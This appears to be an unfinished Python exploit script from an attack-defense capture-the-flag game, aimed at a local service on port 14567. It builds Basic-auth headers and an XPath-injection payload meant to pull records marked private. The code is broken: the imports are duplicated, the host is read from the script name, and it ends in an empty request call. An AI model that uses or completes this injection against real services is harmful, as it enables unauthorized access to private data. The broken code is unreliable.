import requests as rq
import sys 
from random import choice, randint
from string import  ascii_letters
from base64 import b64encode
import requests as rq
import sys 

host = sys.argv[0]

def gen_random_string(N=5):
	return "".join(choice(ascii_letters) for i in range(N))

def create_headers(username, password):
	auth_string = b64encode("{}:{}".format(username, password).encode()).decode()
	headers = {"Authorization":"Basic {}".format(auth_string)}
	return headers

username = "FARGATETOP{}".format(randint(10000, 99999))

try:
	host = sys.argv[0]
except:
	host = "127.0.0.1"
	# host = "6.6.1.2"
id_apology = ""
payload = "{}']/../apology[@private='true".format(id_apology)
host = "127.0.0.1"
# host = "6.6.1.2"
url = "http://{}:14567".format(host)
rq.get()


